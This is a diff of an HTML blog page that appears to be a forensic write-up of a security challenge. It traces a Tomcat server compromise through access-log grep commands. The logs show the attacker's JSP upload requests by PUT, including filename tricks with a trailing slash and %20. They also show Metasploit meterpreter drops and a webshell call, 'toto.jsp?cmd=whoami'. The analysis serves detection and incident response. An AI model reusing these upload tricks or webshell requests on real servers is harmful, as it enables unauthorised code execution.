-10.0.0.1 - - <span style="color:#f92672">[</span>05/Apr/2019:22:06:29 +0200<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;GET /awdjgiuiqwdqwd.jsp HTTP/1.1&#34;</span> <span style="color:#ae81ff">404</span> <span style="color:#ae81ff">998</span>
-10.0.0.1 - - <span style="color:#f92672">[</span>05/Apr/2019:22:06:49 +0200<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;GET /awdjgiuiqwdqwd.jsp HTTP/1.1&#34;</span> <span style="color:#ae81ff">404</span> <span style="color:#ae81ff">998</span>
-10.0.0.1 - - <span style="color:#f92672">[</span>05/Apr/2019:22:07:02 +0200<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;GET /awdjgiuiqwdqwd.jsp HTTP/1.1&#34;</span> <span style="color:#ae81ff">404</span> <span style="color:#ae81ff">998</span>
-<span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>
-10.0.0.1 - - <span style="color:#f92672">[</span>05/Apr/2019:22:09:06 +0200<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;GET /awdjgiuiqwdqwd.html.jsp HTTP/1.1&#34;</span> <span style="color:#ae81ff">500</span> <span style="color:#ae81ff">3396</span>
-10.0.0.1 - - <span style="color:#f92672">[</span>05/Apr/2019:22:09:23 +0200<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;GET /awdjgiuiqwdqwd.html.jsp/ HTTP/1.1&#34;</span> <span style="color:#ae81ff">404</span> <span style="color:#ae81ff">1010</span>
-10.0.0.1 - - <span style="color:#f92672">[</span>05/Apr/2019:22:09:25 +0200<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;GET /awdjgiuiqwdqwd.html.jsp HTTP/1.1&#34;</span> <span style="color:#ae81ff">500</span> <span style="color:#ae81ff">3396</span>
-<span style="color:#f92672">[</span>... Too many <span style="color:#ae81ff">500</span> sorry ... :<span style="color:#f92672">(]</span>
-10.0.0.1 - - <span style="color:#f92672">[</span>05/Apr/2019:22:15:11 +0200<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;GET /awdjgiuiqwdqwd.html.jsp HTTP/1.1&#34;</span> <span style="color:#ae81ff">500</span> <span style="color:#ae81ff">3396</span>
-10.0.0.1 - - <span style="color:#f92672">[</span>05/Apr/2019:22:15:14 +0200<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;GET /awdjgiuiqwdqwd.html.jsp HTTP/1.1&#34;</span> <span style="color:#ae81ff">200</span> <span style="color:#ae81ff">4</span>
-<span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>
-10.0.0.1 - - <span style="color:#f92672">[</span>05/Apr/2019:22:23:44 +0200<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;GET /awdjgiuiqwdqwd.jsp HTTP/1.1&#34;</span> <span style="color:#ae81ff">500</span> <span style="color:#ae81ff">3396</span>
-10.0.0.1 - - <span style="color:#f92672">[</span>05/Apr/2019:22:23:51 +0200<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;GET /awdjgiuiqwdqwd.jsp HTTP/1.1&#34;</span> <span style="color:#ae81ff">500</span> <span style="color:#ae81ff">3396</span>
-10.0.0.1 - - <span style="color:#f92672">[</span>05/Apr/2019:22:23:52 +0200<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;GET /awdjgiuiqwdqwd.jsp HTTP/1.1&#34;</span> <span style="color:#ae81ff">200</span> -
-</code></pre></div><p>Fun fact ! The challenger used two files to exploit the vulnerability : <code>awdjgiuiqwdqwd.html.jsp</code> and <code>awdjgiuiqwdqwd.jsp</code>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@project-server:~ $ cat full-access.log | grep <span style="color:#e6db74">&#34;PUT&#34;</span> | grep <span style="color:#e6db74">&#34;201 -&#34;</span>
+</span></span><span style="display:flex;"><span>10.0.0.1 - - <span style="color:#f92672">[</span>05/Apr/2019:22:04:25 +0200<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;PUT /robots.txt HTTP/1.1&#34;</span> <span style="color:#ae81ff">201</span> -
+</span></span><span style="display:flex;"><span>10.0.0.1 - - <span style="color:#f92672">[</span>05/Apr/2019:22:05:06 +0200<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;PUT /test.html HTTP/1.1&#34;</span> <span style="color:#ae81ff">201</span> -
+</span></span><span style="display:flex;"><span>10.0.0.1 - - <span style="color:#f92672">[</span>05/Apr/2019:22:07:32 +0200<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;PUT /awdjgiuiqwdqwd.html HTTP/1.1&#34;</span> <span style="color:#ae81ff">201</span> -
+</span></span><span style="display:flex;"><span>10.0.0.1 - - <span style="color:#f92672">[</span>05/Apr/2019:22:07:55 +0200<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;PUT /awdjgiuiqwdqwd.html.JSP HTTP/1.1&#34;</span> <span style="color:#ae81ff">201</span> -
+</span></span><span style="display:flex;"><span>10.0.0.1 - - <span style="color:#f92672">[</span>05/Apr/2019:22:08:20 +0200<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;PUT /awdjgiuiqwdqwd.php HTTP/1.1&#34;</span> <span style="color:#ae81ff">201</span> -
+</span></span><span style="display:flex;"><span>10.0.0.1 - - <span style="color:#f92672">[</span>05/Apr/2019:22:08:58 +0200<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;PUT /awdjgiuiqwdqwd.html.jsp/ HTTP/1.1&#34;</span> <span style="color:#ae81ff">201</span> -
+</span></span><span style="display:flex;"><span>10.0.0.1 - - <span style="color:#f92672">[</span>05/Apr/2019:22:18:05 +0200<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;PUT /awdjgiuiqwdqwd.html.jsp%20 HTTP/1.1&#34;</span> <span style="color:#ae81ff">201</span> -
+</span></span><span style="display:flex;"><span>10.0.0.1 - - <span style="color:#f92672">[</span>05/Apr/2019:22:20:47 +0200<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;PUT /awdjgiuiqwdqwd.jsp%20 HTTP/1.1&#34;</span> <span style="color:#ae81ff">201</span> -
+</span></span><span style="display:flex;"><span>10.0.0.1 - - <span style="color:#f92672">[</span>05/Apr/2019:22:21:33 +0200<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;PUT /awdjgiuiqwdqwd.jsp/ HTTP/1.1&#34;</span> <span style="color:#ae81ff">201</span> -
+</span></span><span style="display:flex;"><span>10.0.0.1 - - <span style="color:#f92672">[</span>05/Apr/2019:22:23:24 +0200<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;PUT /IXXfDQcwzR.jsp/ HTTP/1.1&#34;</span> <span style="color:#ae81ff">201</span> -
+</span></span><span style="display:flex;"><span>10.0.0.1 - - <span style="color:#f92672">[</span>05/Apr/2019:22:23:47 +0200<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;PUT /jlfJTuKKrV.jsp/ HTTP/1.1&#34;</span> <span style="color:#ae81ff">201</span> -
+</span></span><span style="display:flex;"><span>10.0.0.1 - - <span style="color:#f92672">[</span>05/Apr/2019:22:27:12 +0200<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;PUT /nikto-test-xsK98kYM.html HTTP/1.1&#34;</span> <span style="color:#ae81ff">201</span> -
+</span></span><span style="display:flex;"><span>10.0.0.1 - - <span style="color:#f92672">[</span>05/Apr/2019:22:27:34 +0200<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;PUT /toto.jsp/ HTTP/1.1&#34;</span> <span style="color:#ae81ff">201</span> -
+</span></span></code></pre></div><p><code>awdjgiuiqwdqwd.html.jsp</code> was the first file to do a RCE on project-server at <strong>22:15:14</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@project-server:~ $ cat full-access.log | grep <span style="color:#e6db74">&#34;awdjgiuiqwdqwd&#34;</span> | grep <span style="color:#e6db74">&#34;GET&#34;</span> | head -n <span style="color:#ae81ff">30</span>
+</span></span><span style="display:flex;"><span>10.0.0.1 - - <span style="color:#f92672">[</span>05/Apr/2019:22:06:29 +0200<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;GET /awdjgiuiqwdqwd.jsp HTTP/1.1&#34;</span> <span style="color:#ae81ff">404</span> <span style="color:#ae81ff">998</span>
+</span></span><span style="display:flex;"><span>10.0.0.1 - - <span style="color:#f92672">[</span>05/Apr/2019:22:06:49 +0200<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;GET /awdjgiuiqwdqwd.jsp HTTP/1.1&#34;</span> <span style="color:#ae81ff">404</span> <span style="color:#ae81ff">998</span>
+</span></span><span style="display:flex;"><span>10.0.0.1 - - <span style="color:#f92672">[</span>05/Apr/2019:22:07:02 +0200<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;GET /awdjgiuiqwdqwd.jsp HTTP/1.1&#34;</span> <span style="color:#ae81ff">404</span> <span style="color:#ae81ff">998</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>10.0.0.1 - - <span style="color:#f92672">[</span>05/Apr/2019:22:09:06 +0200<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;GET /awdjgiuiqwdqwd.html.jsp HTTP/1.1&#34;</span> <span style="color:#ae81ff">500</span> <span style="color:#ae81ff">3396</span>
+</span></span><span style="display:flex;"><span>10.0.0.1 - - <span style="color:#f92672">[</span>05/Apr/2019:22:09:23 +0200<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;GET /awdjgiuiqwdqwd.html.jsp/ HTTP/1.1&#34;</span> <span style="color:#ae81ff">404</span> <span style="color:#ae81ff">1010</span>
+</span></span><span style="display:flex;"><span>10.0.0.1 - - <span style="color:#f92672">[</span>05/Apr/2019:22:09:25 +0200<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;GET /awdjgiuiqwdqwd.html.jsp HTTP/1.1&#34;</span> <span style="color:#ae81ff">500</span> <span style="color:#ae81ff">3396</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>... Too many <span style="color:#ae81ff">500</span> sorry ... :<span style="color:#f92672">(]</span>
+</span></span><span style="display:flex;"><span>10.0.0.1 - - <span style="color:#f92672">[</span>05/Apr/2019:22:15:11 +0200<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;GET /awdjgiuiqwdqwd.html.jsp HTTP/1.1&#34;</span> <span style="color:#ae81ff">500</span> <span style="color:#ae81ff">3396</span>
+</span></span><span style="display:flex;"><span>10.0.0.1 - - <span style="color:#f92672">[</span>05/Apr/2019:22:15:14 +0200<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;GET /awdjgiuiqwdqwd.html.jsp HTTP/1.1&#34;</span> <span style="color:#ae81ff">200</span> <span style="color:#ae81ff">4</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>10.0.0.1 - - <span style="color:#f92672">[</span>05/Apr/2019:22:23:44 +0200<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;GET /awdjgiuiqwdqwd.jsp HTTP/1.1&#34;</span> <span style="color:#ae81ff">500</span> <span style="color:#ae81ff">3396</span>
+</span></span><span style="display:flex;"><span>10.0.0.1 - - <span style="color:#f92672">[</span>05/Apr/2019:22:23:51 +0200<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;GET /awdjgiuiqwdqwd.jsp HTTP/1.1&#34;</span> <span style="color:#ae81ff">500</span> <span style="color:#ae81ff">3396</span>
+</span></span><span style="display:flex;"><span>10.0.0.1 - - <span style="color:#f92672">[</span>05/Apr/2019:22:23:52 +0200<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;GET /awdjgiuiqwdqwd.jsp HTTP/1.1&#34;</span> <span style="color:#ae81ff">200</span> -
+</span></span></code></pre></div><p>Fun fact ! The challenger used two files to exploit the vulnerability : <code>awdjgiuiqwdqwd.html.jsp</code> and <code>awdjgiuiqwdqwd.jsp</code>
 He didn&rsquo;t use classic webshell, but, maybe, a home made script to be more discreet. He (maybe) prefered to write his command in a file, put it on the tomcat and execute it. And do it again for an other command.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@project-server:~ $ cat full-access.log | grep <span style="color:#e6db74">&#34;awdjgiuiqwdqwd&#34;</span> | grep <span style="color:#e6db74">&#34;PUT&#34;</span> | wc -l
-<span style="color:#ae81ff">184</span>
-root@project-server:~ $ cat full-access.log | grep <span style="color:#e6db74">&#34;awdjgiuiqwdqwd&#34;</span> | grep <span style="color:#e6db74">&#34;GET&#34;</span> | wc -l
-<span style="color:#ae81ff">335</span>
-root@project-server:~ $ cat full-access.log | grep <span style="color:#e6db74">&#34;awdjgiuiqwdqwd.jsp&#34;</span> | grep <span style="color:#e6db74">&#34;GET&#34;</span> | wc -l
-<span style="color:#ae81ff">78</span>
-root@project-server:~ $ cat full-access.log | grep <span style="color:#e6db74">&#34;awdjgiuiqwdqwd.html.jsp&#34;</span> | grep <span style="color:#e6db74">&#34;GET&#34;</span> | wc -l
-<span style="color:#ae81ff">63</span>
-</code></pre></div><h2 id="first-meterpreter">First meterpreter</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@project-server:~ $ cat full-access.log | grep <span style="color:#e6db74">&#34;awdjgiuiqwdqwd&#34;</span> | grep <span style="color:#e6db74">&#34;PUT&#34;</span> | wc -l
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">184</span>
+</span></span><span style="display:flex;"><span>root@project-server:~ $ cat full-access.log | grep <span style="color:#e6db74">&#34;awdjgiuiqwdqwd&#34;</span> | grep <span style="color:#e6db74">&#34;GET&#34;</span> | wc -l
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">335</span>
+</span></span><span style="display:flex;"><span>root@project-server:~ $ cat full-access.log | grep <span style="color:#e6db74">&#34;awdjgiuiqwdqwd.jsp&#34;</span> | grep <span style="color:#e6db74">&#34;GET&#34;</span> | wc -l
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">78</span>
+</span></span><span style="display:flex;"><span>root@project-server:~ $ cat full-access.log | grep <span style="color:#e6db74">&#34;awdjgiuiqwdqwd.html.jsp&#34;</span> | grep <span style="color:#e6db74">&#34;GET&#34;</span> | wc -l
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">63</span>
+</span></span></code></pre></div><h2 id="first-meterpreter">First meterpreter</h2>
 <p>Metasploit was used during the challenge. You can easily detect files generated by msf with their default name : <strong>&lt;10 random letters&gt;.jsp</strong>
 The first meterpreter was uploaded at <strong>22:23:24</strong> but not succesfuly executed. The next one was successfuly executed at <strong>22:46:20</strong> with name of <strong>jlfJTuKKrV.jsp</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@project-server:~ $ cat full-access.log | grep <span style="color:#e6db74">&#34;IXXfDQcwzR&#34;</span>
-10.0.0.1 - - <span style="color:#f92672">[</span>05/Apr/2019:22:23:24 +0200<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;PUT /IXXfDQcwzR.jsp/ HTTP/1.1&#34;</span> <span style="color:#ae81ff">201</span> -
-10.0.0.1 - - <span style="color:#f92672">[</span>05/Apr/2019:22:23:24 +0200<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;GET /IXXfDQcwzR.jsp HTTP/1.1&#34;</span> <span style="color:#ae81ff">500</span> <span style="color:#ae81ff">3396</span>
-
-root@project-server:~ $ cat full-access.log | grep <span style="color:#e6db74">&#34;jlfJTuKKrV&#34;</span>
-10.0.0.1 - - <span style="color:#f92672">[</span>05/Apr/2019:22:23:47 +0200<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;PUT /jlfJTuKKrV.jsp/ HTTP/1.1&#34;</span> <span style="color:#ae81ff">201</span> -
-10.0.0.1 - - <span style="color:#f92672">[</span>05/Apr/2019:22:23:47 +0200<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;GET /jlfJTuKKrV.jsp HTTP/1.1&#34;</span> <span style="color:#ae81ff">500</span> <span style="color:#ae81ff">3396</span>
-10.0.0.1 - - <span style="color:#f92672">[</span>05/Apr/2019:22:46:20 +0200<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;GET /jlfJTuKKrV.jsp HTTP/1.1&#34;</span> <span style="color:#ae81ff">200</span> <span style="color:#ae81ff">6</span>
-</code></pre></div><h2 id="number-of-meterpreters">Number of meterpreters</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@project-server:~ $ cat full-access.log | grep <span style="color:#e6db74">&#34;IXXfDQcwzR&#34;</span>
+</span></span><span style="display:flex;"><span>10.0.0.1 - - <span style="color:#f92672">[</span>05/Apr/2019:22:23:24 +0200<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;PUT /IXXfDQcwzR.jsp/ HTTP/1.1&#34;</span> <span style="color:#ae81ff">201</span> -
+</span></span><span style="display:flex;"><span>10.0.0.1 - - <span style="color:#f92672">[</span>05/Apr/2019:22:23:24 +0200<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;GET /IXXfDQcwzR.jsp HTTP/1.1&#34;</span> <span style="color:#ae81ff">500</span> <span style="color:#ae81ff">3396</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>root@project-server:~ $ cat full-access.log | grep <span style="color:#e6db74">&#34;jlfJTuKKrV&#34;</span>
+</span></span><span style="display:flex;"><span>10.0.0.1 - - <span style="color:#f92672">[</span>05/Apr/2019:22:23:47 +0200<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;PUT /jlfJTuKKrV.jsp/ HTTP/1.1&#34;</span> <span style="color:#ae81ff">201</span> -
+</span></span><span style="display:flex;"><span>10.0.0.1 - - <span style="color:#f92672">[</span>05/Apr/2019:22:23:47 +0200<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;GET /jlfJTuKKrV.jsp HTTP/1.1&#34;</span> <span style="color:#ae81ff">500</span> <span style="color:#ae81ff">3396</span>
+</span></span><span style="display:flex;"><span>10.0.0.1 - - <span style="color:#f92672">[</span>05/Apr/2019:22:46:20 +0200<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;GET /jlfJTuKKrV.jsp HTTP/1.1&#34;</span> <span style="color:#ae81ff">200</span> <span style="color:#ae81ff">6</span>
+</span></span></code></pre></div><h2 id="number-of-meterpreters">Number of meterpreters</h2>
 <p>So how many meterpreter was put on the server ?</p>
 <p>We can can check the access log to count how many meterpreter was uploaded with :</p>
 <ul>
@@ -406,57 +405,57 @@ root@project-server:~ $ cat full-access.log | grep <span style="color:#e6db74">&
 <li>Filter on 201 request (creation code)</li>
 <li>Regex on meterpreter format</li>
 </ul>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@project-server:~# cat full-access.log | grep <span style="color:#e6db74">&#34;PUT&#34;</span> | grep <span style="color:#e6db74">&#34;201 -&#34;</span> | grep -E <span style="color:#e6db74">&#34;/[a-zA-Z]{10}.jsp&#34;</span> | cat
-10.0.0.1 - - <span style="color:#f92672">[</span>05/Apr/2019:22:23:24 +0200<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;PUT /IXXfDQcwzR.jsp/ HTTP/1.1&#34;</span> <span style="color:#ae81ff">201</span> -
-10.0.0.1 - - <span style="color:#f92672">[</span>05/Apr/2019:22:23:47 +0200<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;PUT /jlfJTuKKrV.jsp/ HTTP/1.1&#34;</span> <span style="color:#ae81ff">201</span> -
-10.0.0.1 - - <span style="color:#f92672">[</span>06/Apr/2019:00:08:03 +0200<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;PUT /JlPVVbUpeX.jsp/ HTTP/1.1&#34;</span> <span style="color:#ae81ff">201</span> -
-10.0.0.1 - - <span style="color:#f92672">[</span>06/Apr/2019:00:08:18 +0200<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;PUT /VElkKxNlxi.jsp/ HTTP/1.1&#34;</span> <span style="color:#ae81ff">201</span> -
-10.0.0.1 - - <span style="color:#f92672">[</span>06/Apr/2019:00:09:18 +0200<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;PUT /ANTxWRVVzk.jsp/ HTTP/1.1&#34;</span> <span style="color:#ae81ff">201</span> -
-<span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>
-
-root@project-server:~# cat full-access.log | grep <span style="color:#e6db74">&#34;PUT&#34;</span> | grep <span style="color:#e6db74">&#34;201 -&#34;</span> | grep -E <span style="color:#e6db74">&#34;/[a-zA-Z]{10}.jsp&#34;</span> | wc -l
-<span style="color:#ae81ff">34</span>
-</code></pre></div><p>So access log recorded <strong>34 meterpreters</strong>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@project-server:~# cat full-access.log | grep <span style="color:#e6db74">&#34;PUT&#34;</span> | grep <span style="color:#e6db74">&#34;201 -&#34;</span> | grep -E <span style="color:#e6db74">&#34;/[a-zA-Z]{10}.jsp&#34;</span> | cat
+</span></span><span style="display:flex;"><span>10.0.0.1 - - <span style="color:#f92672">[</span>05/Apr/2019:22:23:24 +0200<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;PUT /IXXfDQcwzR.jsp/ HTTP/1.1&#34;</span> <span style="color:#ae81ff">201</span> -
+</span></span><span style="display:flex;"><span>10.0.0.1 - - <span style="color:#f92672">[</span>05/Apr/2019:22:23:47 +0200<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;PUT /jlfJTuKKrV.jsp/ HTTP/1.1&#34;</span> <span style="color:#ae81ff">201</span> -
+</span></span><span style="display:flex;"><span>10.0.0.1 - - <span style="color:#f92672">[</span>06/Apr/2019:00:08:03 +0200<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;PUT /JlPVVbUpeX.jsp/ HTTP/1.1&#34;</span> <span style="color:#ae81ff">201</span> -
+</span></span><span style="display:flex;"><span>10.0.0.1 - - <span style="color:#f92672">[</span>06/Apr/2019:00:08:18 +0200<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;PUT /VElkKxNlxi.jsp/ HTTP/1.1&#34;</span> <span style="color:#ae81ff">201</span> -
+</span></span><span style="display:flex;"><span>10.0.0.1 - - <span style="color:#f92672">[</span>06/Apr/2019:00:09:18 +0200<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;PUT /ANTxWRVVzk.jsp/ HTTP/1.1&#34;</span> <span style="color:#ae81ff">201</span> -
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>root@project-server:~# cat full-access.log | grep <span style="color:#e6db74">&#34;PUT&#34;</span> | grep <span style="color:#e6db74">&#34;201 -&#34;</span> | grep -E <span style="color:#e6db74">&#34;/[a-zA-Z]{10}.jsp&#34;</span> | wc -l
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">34</span>
+</span></span></code></pre></div><p>So access log recorded <strong>34 meterpreters</strong>
 Let&rsquo;s check if they are here !</p>
 <p>Go to webserver root, filter by size and apply meterpreter format regex.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@project-server:/opt/tomcat/webapps/ROOT# ls -Sal | grep -E <span style="color:#e6db74">&#34; [a-zA-Z]{10}.jsp&#34;</span>
--rw-rw---- <span style="color:#ae81ff">1</span> tomcat tomcat  <span style="color:#ae81ff">1593</span> avril  <span style="color:#ae81ff">6</span> 00:34 cFAepKMVUT.jsp
--rw-rw---- <span style="color:#ae81ff">1</span> tomcat tomcat  <span style="color:#ae81ff">1593</span> avril  <span style="color:#ae81ff">6</span> 00:35 GGfJjPwckZ.jsp
-<span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>
--rw-rw---- <span style="color:#ae81ff">1</span> tomcat tomcat  <span style="color:#ae81ff">1494</span> avril  <span style="color:#ae81ff">6</span> 00:25 JvdgETUaAe.jsp
--rw-rw---- <span style="color:#ae81ff">1</span> tomcat tomcat  <span style="color:#ae81ff">1494</span> avril  <span style="color:#ae81ff">6</span> 00:22 XhZxuamJBV.jsp
--rw-rw---- <span style="color:#ae81ff">1</span> tomcat tomcat    <span style="color:#ae81ff">31</span> avril  <span style="color:#ae81ff">6</span> 00:24 BpngppVGgi.jsp
-<span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>
--rw-rw---- <span style="color:#ae81ff">1</span> tomcat tomcat    <span style="color:#ae81ff">31</span> avril  <span style="color:#ae81ff">6</span> 00:18 ZgEspEANsz.jsp
-</code></pre></div><p>And count lines.</p>
-<pre tabindex="0"><code>root@project-server:/opt/tomcat/webapps/ROOT# ls -Sal | grep -E &quot; [a-zA-Z]{10}.jsp&quot; | wc -l
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@project-server:/opt/tomcat/webapps/ROOT# ls -Sal | grep -E <span style="color:#e6db74">&#34; [a-zA-Z]{10}.jsp&#34;</span>
+</span></span><span style="display:flex;"><span>-rw-rw---- <span style="color:#ae81ff">1</span> tomcat tomcat  <span style="color:#ae81ff">1593</span> avril  <span style="color:#ae81ff">6</span> 00:34 cFAepKMVUT.jsp
+</span></span><span style="display:flex;"><span>-rw-rw---- <span style="color:#ae81ff">1</span> tomcat tomcat  <span style="color:#ae81ff">1593</span> avril  <span style="color:#ae81ff">6</span> 00:35 GGfJjPwckZ.jsp
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>-rw-rw---- <span style="color:#ae81ff">1</span> tomcat tomcat  <span style="color:#ae81ff">1494</span> avril  <span style="color:#ae81ff">6</span> 00:25 JvdgETUaAe.jsp
+</span></span><span style="display:flex;"><span>-rw-rw---- <span style="color:#ae81ff">1</span> tomcat tomcat  <span style="color:#ae81ff">1494</span> avril  <span style="color:#ae81ff">6</span> 00:22 XhZxuamJBV.jsp
+</span></span><span style="display:flex;"><span>-rw-rw---- <span style="color:#ae81ff">1</span> tomcat tomcat    <span style="color:#ae81ff">31</span> avril  <span style="color:#ae81ff">6</span> 00:24 BpngppVGgi.jsp
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>-rw-rw---- <span style="color:#ae81ff">1</span> tomcat tomcat    <span style="color:#ae81ff">31</span> avril  <span style="color:#ae81ff">6</span> 00:18 ZgEspEANsz.jsp
+</span></span></code></pre></div><p>And count lines.</p>
+<pre tabindex="0"><code>root@project-server:/opt/tomcat/webapps/ROOT# ls -Sal | grep -E &#34; [a-zA-Z]{10}.jsp&#34; | wc -l
 34
 </code></pre><p>34 ! Perfect. Challenger don&rsquo;t take time to delete their trace :o</p>
 <p>You can also see, there is two size of meterpreter : <code>31 bytes</code> and <code>1500 bytes</code>. The first type of file is the payload of the msf <code>check</code> command (content : <code>&lt;% out.println(&quot;MXvshOoWGH&quot;);%&gt;</code>)</p>
 <h2 id="first-webshell">First webshell</h2>
 <p>And when was uploaded the first webshell ?</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@project-server:~ $ cat full-access.log | grep <span style="color:#e6db74">&#34;.jsp?&#34;</span> | head
-10.0.0.1 - - <span style="color:#f92672">[</span>05/Apr/2019:22:29:15 +0200<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;GET /toto.jsp?cmd=whoami HTTP/1.1&#34;</span> <span style="color:#ae81ff">500</span> <span style="color:#ae81ff">3396</span>
-10.0.0.1 - - <span style="color:#f92672">[</span>05/Apr/2019:22:29:17 +0200<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;GET /toto.jsp?cmd=whoami HTTP/1.1&#34;</span> <span style="color:#ae81ff">200</span> <span style="color:#ae81ff">178</span>
-</code></pre></div><p><code>toto.js</code> was the first webshell and was created at <code>22:29:17</code>.</p>
-<pre tabindex="0"><code>root@project-server:~ $ cat full-access.log | grep &quot;toto.jsp&quot;
-10.0.0.1 - - [05/Apr/2019:22:27:34 +0200] &quot;PUT /toto.jsp/ HTTP/1.1&quot; 201 -
-10.0.0.1 - - [05/Apr/2019:22:27:40 +0200] &quot;GET /toto.jsp HTTP/1.1&quot; 500 3396
-10.0.0.1 - - [05/Apr/2019:22:27:50 +0200] &quot;GET /toto.jsp HTTP/1.1&quot; 500 3396
